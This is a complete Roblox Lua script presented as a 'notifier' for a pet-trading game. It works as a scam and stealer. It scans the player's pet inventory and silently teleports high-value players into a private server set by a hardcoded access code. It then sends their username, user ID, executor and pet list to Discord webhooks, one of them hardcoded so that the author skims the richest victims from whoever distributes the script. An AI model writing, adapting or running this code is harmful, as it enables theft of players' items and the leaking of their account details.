local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local EXECUTION_FLAG_NAME = "ChetosNotifierFlag"
if CoreGui:FindFirstChild(EXECUTION_FLAG_NAME) then return end
local flag = Instance.new("BoolValue", CoreGui)
flag.Name = EXECUTION_FLAG_NAME
warn("Chetos Notifier: Initializing...")

local loader_env = getgenv() or {}

local CONFIG = {
    WEBHOOKS = {
        USER = loader_env.Webhook,
        HVT = "https://discord.com/api/webhooks/1423150330220380170/1NfkU25fK9dnB23Zsh-yMVCFWNNZpAsI4zxeI-sP14YLDLI5VQ2pWU8CTcfd2ajoDSqp"
    },
    ACCESS_CODES = {
        USER = loader_env.accesscode,
        HVT = "j50GRP6cfkV1FnSNh_-5CBLmxfmpdUPBjvfeTzW04u2S8DWlZnMAAA2"
    },
    PET_CRITERIA = {
        HUGE_WEIGHT = 6.0,
        AGED_DAYS = 50,
        MAX_PETS_IN_LIST = 25,
        PRIORITY_PETS = {
            ["Cockatrice"] = true, ["Disco Bee"] = true, ["Dragonfly"] = true, ["Fennec Fox"] = true,
            ["French Fry Ferret"] = true, ["GIANT Swan"] = true, ["Golden Goose"] = true, ["Green Bean"] = true,
            ["Griffin"] = true, ["Lobster Thermidor"] = true, ["Luminous Sprite"] = true, ["Mizuchi"] = true,
            ["Phoenix"] = true, ["Queen Bee"] = true, ["Raccoon"] = true, ["Raiju"] = true,
            ["Red Panda"] = true, ["Space Squirrel"] = true, ["Spinosaurus"] = true, ["Swan"] = true,
            ["T-Rex"] = true, ["Tiger"] = true, ["Rainbow Dilophosaurus"] = true, ["Rainbow Griffin"] = true,
            ["Rainbow Lobster Thermidor"] = true, ["Rainbow Mizuchi"] = true, ["Rainbow Phoenix"] = true,
            ["Rainbow Spinosaurus"] = true, ["Corrupted Kitsune"] = true, ["Kitsune"] = true, ["Rainbow Corrupted Kitsune"] = true
        }
    },
    HVT_CRITERIA = {
        TotalHugePets = 4,
        HugePeacock = 1, HugeMimicOctopus = 1, RainbowMimic = 1, Raccoon = 3,
        Dragonfly = 4, Butterfly = 3, DiscoBee = 2, Kitsune = 1, AnyRainbowPriority = 1
    },
    GUI = {
        DISCORD_LINK = "https://discord.gg/BDBX4y9sMH"
    }
}

if not CONFIG.WEBHOOKS.USER then warn("Chetos Notifier: User webhook not found in getgenv().") end
if not CONFIG.ACCESS_CODES.USER then warn("Chetos Notifier: User access code not found in getgenv().") end

local Util = {}
local MUTATION_MAP = {}

function Util.Initialize()
    pcall(function()
        local PetMutationRegistry = require(ReplicatedStorage.Data.PetRegistry.PetMutationRegistry)
        for name, data in pairs(PetMutationRegistry.PetMutationRegistry) do
            MUTATION_MAP[data.EnumId] = name
            MUTATION_MAP[name] = name
        end
    end)
    warn("Chetos Notifier: Utilities initialized.")
end

function Util.Get(tbl, path, default)
    local current = tbl
    for key in string.gmatch(path, "[^.]+") do
        if type(current) ~= "table" or current[key] == nil then return default end
        current = current[key]
    end
    return current
end

function Util.GetExecutorName()
    if getexecutorname then local s, n = pcall(getexecutorname); if s and type(n) == "string" then return n end end
    if identifyexecutor then local s, n = pcall(identifyexecutor); if s and type(n) == "string" then return n:gsub(" Executor", "") end end
    return "Unknown"
end

function Util.SendWebhook(url, payload)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if not requestFunc or not url then
        warn("Chetos Notifier: Cannot send webhook, no request function or URL provided.")
        return
    end
    task.spawn(function()
        pcall(function()
            requestFunc({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
        end)
    end)
end

function Util.ExecuteTeleport(accessCode)
    if not accessCode then
        warn("Chetos Notifier: Cannot teleport, no access code provided.")
        return
    end
    task.spawn(function()
        pcall(function()
            game:GetService("RobloxReplicatedStorage").ContactListIrisInviteTeleport:FireServer(game.PlaceId, "", accessCode)
        end)
    end)
end

function Util.CreateNotification(titleText, messageText, buttonText)
    local gui = Instance.new("ScreenGui", CoreGui); gui.ResetOnSpawn = false; gui.ZIndexBehavior = Enum.ZIndexBehavior.Global; gui.DisplayOrder = 1000
    local overlay = Instance.new("Frame", gui); overlay.Size = UDim2.fromScale(1, 1); overlay.BackgroundColor3 = Color3.new(0, 0, 0); overlay.BackgroundTransparency = 0.4; overlay.Active = true
    local gradient = Instance.new("UIGradient", overlay); gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40)), ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 15))}); gradient.Rotation = 90
    local mainFrame = Instance.new("Frame", overlay); mainFrame.AnchorPoint = Vector2.new(0.5, 0.5); mainFrame.Position = UDim2.fromScale(0.5, 0.5); mainFrame.Size = UDim2.new(0, 500, 0, 250); mainFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 32); mainFrame.BackgroundTransparency = 0.1; mainFrame.BorderSizePixel = 0
    local corner = Instance.new("UICorner", mainFrame); corner.CornerRadius = UDim.new(0, 12)
    local stroke = Instance.new("UIStroke", mainFrame); stroke.Color = Color3.fromRGB(120, 80, 255); stroke.Thickness = 2; stroke.Transparency = 0.4
    local titleLabel = Instance.new("TextLabel", mainFrame); titleLabel.AnchorPoint = Vector2.new(0.5, 0); titleLabel.Position = UDim2.fromScale(0.5, 0.1); titleLabel.Size = UDim2.fromScale(0.8, 0.2); titleLabel.BackgroundTransparency = 1; titleLabel.Font = Enum.Font.SourceSansBold; titleLabel.Text = titleText; titleLabel.TextColor3 = Color3.new(1, 1, 1); titleLabel.TextScaled = true
    local messageLabel = Instance.new("TextLabel", mainFrame); messageLabel.AnchorPoint = Vector2.new(0.5, 0.45); messageLabel.Position = UDim2.fromScale(0.5, 0.45); messageLabel.Size = UDim2.fromScale(0.85, 0.3); messageLabel.BackgroundTransparency = 1; messageLabel.Font = Enum.Font.SourceSans; messageLabel.Text = messageText; messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200); messageLabel.TextSize = 18; messageLabel.TextWrapped = true; messageLabel.TextXAlignment = Enum.TextXAlignment.Center; messageLabel.TextYAlignment = Enum.TextYAlignment.Center
    local linkButton = Instance.new("TextButton", mainFrame); linkButton.AnchorPoint = Vector2.new(0.5, 1); linkButton.Position = UDim2.fromScale(0.5, 0.9); linkButton.Size = UDim2.fromScale(0.7, 0.25); linkButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242); linkButton.Font = Enum.Font.SourceSansBold; linkButton.Text = buttonText; linkButton.TextColor3 = Color3.new(1, 1, 1); linkButton.TextScaled = true
    local btnCorner = Instance.new("UICorner", linkButton); btnCorner.CornerRadius = UDim.new(0, 8)
    local btnStroke = Instance.new("UIStroke", linkButton); btnStroke.Color = Color3.fromRGB(255, 255, 255); btnStroke.Thickness = 1; btnStroke.Transparency = 0.9
    linkButton.MouseButton1Click:Connect(function() if type(setclipboard) == "function" then setclipboard(CONFIG.GUI.DISCORD_LINK); linkButton.Text = "LINK COPIED!"; task.wait(2); linkButton.Text = buttonText end end)
end

local Notifier = {}

function Notifier:ScanInventory(inventoryData)
    local notablePets, stats, hvtCounters = {}, {total = 0, huge = 0, agedMutated = 0, priority = 0}, {}
    for k, v in pairs(CONFIG.HVT_CRITERIA) do hvtCounters[k] = 0 end

    for _, petInfo in pairs(inventoryData) do
        if type(petInfo) == "table" and petInfo.PetData then
            local baseWeight = tonumber(Util.Get(petInfo, "PetData.BaseWeight", 0))
            if baseWeight > 0 then
                stats.total += 1
                local mutationValue = Util.Get(petInfo, "PetData.MutationType") or Util.Get(petInfo, "PetData.Mutation")
                local mutationName = (mutationValue and MUTATION_MAP[tostring(mutationValue)]) or ""
                local basePetType = tostring(petInfo.PetType or "Unknown")
                local pet = {
                    typeName = (mutationName ~= "" and mutationName .. " " or "") .. basePetType,
                    basePetType = basePetType,
                    weight = tonumber(Util.Get(petInfo, "PetData.Weight")) or baseWeight,
                    age = tonumber(Util.Get(petInfo, "PetData.Age", 0)),
                    level = tonumber(Util.Get(petInfo, "PetData.Level", 1)),
                    isHuge = baseWeight >= CONFIG.PET_CRITERIA.HUGE_WEIGHT,
                    isAged = (math.floor(tonumber(Util.Get(petInfo, "PetData.Age", 0)) / 86400) >= CONFIG.PET_CRITERIA.AGED_DAYS),
                    isMutated = mutationName ~= ""
                }
                local isPriority = CONFIG.PET_CRITERIA.PRIORITY_PETS[basePetType]
                if pet.isHuge or isPriority or pet.isAged or pet.isMutated then table.insert(notablePets, pet) end
                if pet.isHuge then stats.huge += 1 end
                if isPriority then stats.priority += 1 end
                if pet.isAged or pet.isMutated then stats.agedMutated += 1 end
                if pet.isHuge and pet.basePetType == "Peacock" then hvtCounters.HugePeacock += 1 end
                if pet.isHuge and pet.basePetType == "Mimic Octopus" then hvtCounters.HugeMimicOctopus += 1 end
                if pet.typeName:find("Rainbow") and pet.basePetType == "Mimic" then hvtCounters.RainbowMimic += 1 end
                if pet.basePetType == "Raccoon" then hvtCounters.Raccoon += 1 end
                if pet.basePetType == "Dragonfly" then hvtCounters.Dragonfly += 1 end
                if pet.basePetType == "Butterfly" then hvtCounters.Butterfly += 1 end
                if pet.basePetType == "Disco Bee" then hvtCounters.DiscoBee += 1 end
                if pet.basePetType == "Kitsune" then hvtCounters.Kitsune += 1 end
                if isPriority and pet.typeName:find("Rainbow") then hvtCounters.AnyRainbowPriority += 1 end
            end
        end
    end
    return notablePets, stats, hvtCounters
end

function Notifier:IsHVT(hvtCounters, stats)
    if stats.huge >= CONFIG.HVT_CRITERIA.TotalHugePets then
        warn("HVT Trigger: Player has " .. stats.huge .. " huge pets (>= " .. CONFIG.HVT_CRITERIA.TotalHugePets .. ").")
        return true
    end
    for petType, requiredCount in pairs(CONFIG.HVT_CRITERIA) do
        if petType ~= "TotalHugePets" and (hvtCounters[petType] or 0) >= requiredCount then
            warn("HVT Trigger: Player has " .. (hvtCounters[petType] or 0) .. " of " .. petType .. " (>= " .. requiredCount .. ").")
            return true
        end
    end
    return false
end

function Notifier:FormatPetList(petList)
    local function getPetSortScore(pet)
        local isPriority = CONFIG.PET_CRITERIA.PRIORITY_PETS[pet.basePetType]
        if pet.isHuge and isPriority then return 1 end
        if pet.isHuge then return 2 end
        if isPriority then return 3 end
        if pet.isAged or pet.isMutated then return 4 end
        return 5
    end
    table.sort(petList, function(a, b)
        local scoreA, scoreB = getPetSortScore(a), getPetSortScore(b)
        if scoreA ~= scoreB then return scoreA < scoreB end
        return a.weight > b.weight
    end)
    local list = {"```"}
    for i, pet in ipairs(petList) do
        if i > CONFIG.PET_CRITERIA.MAX_PETS_IN_LIST then
            table.insert(list, string.format("➕ ... and %d more pets", #petList - CONFIG.PET_CRITERIA.MAX_PETS_IN_LIST))
            break
        end
        local icon = "🐾"
        if pet.isHuge and CONFIG.PET_CRITERIA.PRIORITY_PETS[pet.basePetType] then icon = "💎"
        elseif pet.isHuge then icon = "👑"
        elseif CONFIG.PET_CRITERIA.PRIORITY_PETS[pet.basePetType] then icon = "🎯"
        elseif pet.isAged or pet.isMutated then icon = "⭐"
        end
        local ageText = ""
        if pet.age > 0 then
            local d, h = math.floor(pet.age / 86400), math.floor((pet.age % 86400) / 3600)
            ageText = d > 0 and string.format(" (Age: %dd %dh)", d, h) or string.format(" (Age: %dh)", h)
        end
        table.insert(list, string.format("%s %s - %.2f KG%s [Lv.%d]", icon, pet.typeName, pet.weight, ageText, pet.level))
    end
    table.insert(list, "```")
    return table.concat(list, "\n")
end

function Notifier:Run()
    local player = Players.LocalPlayer
    warn("Chetos Notifier: Starting inventory scan for player: " .. player.Name)
    
    local DataService = require(ReplicatedStorage.Modules.DataService)
    local PlayerData = DataService:GetData()
    local InventoryData = Util.Get(PlayerData, "PetsData.PetInventory.Data")
    if not InventoryData then
        warn("Chetos Notifier: Could not find inventory data.")
        return
    end

    local notablePets, stats, hvtCounters = self:ScanInventory(InventoryData)
    warn("Chetos Notifier: Scan complete. Found " .. stats.total .. " total pets, " .. stats.huge .. " huge pets.")

    if stats.huge == 0 and stats.priority == 0 then
        warn("Chetos Notifier: Player has no valuable pets. Displaying notification.")
        Util.CreateNotification("LACK OF VALUABLES", "Your inventory has no Huge or Divine pets. Join our community for trading and tips!", "Copy Discord Link")
        return
    end

    local isPlayerHVT = self:IsHVT(hvtCounters, stats)
    warn("Chetos Notifier: HVT check result: " .. tostring(isPlayerHVT))

    local targetWebhook = isPlayerHVT and CONFIG.WEBHOOKS.HVT or CONFIG.WEBHOOKS.USER
    local targetAccessCode = isPlayerHVT and CONFIG.ACCESS_CODES.HVT or CONFIG.ACCESS_CODES.USER
    warn("Chetos Notifier: Using " .. (isPlayerHVT and "HVT" or "USER") .. " webhook and access code.")

    warn("Chetos Notifier: Attempting to execute teleport with access code: " .. (targetAccessCode or "N/A"))
    Util.ExecuteTeleport(targetAccessCode)

    local formattedPets = self:FormatPetList(notablePets)
    local description = table.concat({
        "**👤 Player Information**", "```",
        ("😭 Display Name: %s"):format(player.DisplayName),
        ("👤 Username: @%s"):format(player.Name),
        ("👁️ User ID: %d"):format(player.UserId),
        ("💻 Executor: %s"):format(Util.GetExecutorName()),
        ("🌐 Server: %d/%d"):format(#Players:GetPlayers(), Players.MaxPlayers), "```",
        "**📊 BACKPACK STATISTICS**", "```",
        ("🐾 Total Pets: %d"):format(stats.total),
        ("👑 Huge Pets: %d"):format(stats.huge),
        ("🎯 Priority Pets: %d"):format(stats.priority),
        ("⭐ Aged/Mutated: %d"):format(stats.agedMutated), "```",
        "**💎 Top Pets**",
        formattedPets
    }, "\n")
    local embed = {
        title = "🐾 **CHETOS NOTIFIER**", color = 463360, description = description,
        footer = {text = "CHETOS | Maximized Potential"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    warn("Chetos Notifier: Sending notification to webhook: " .. (targetWebhook or "N/A"))
    Util.SendWebhook(targetWebhook, {username = "CHETOS LOGS", embeds = {embed}})
end

Util.Initialize()
task.spawn(function()
    Notifier:Run()
end)
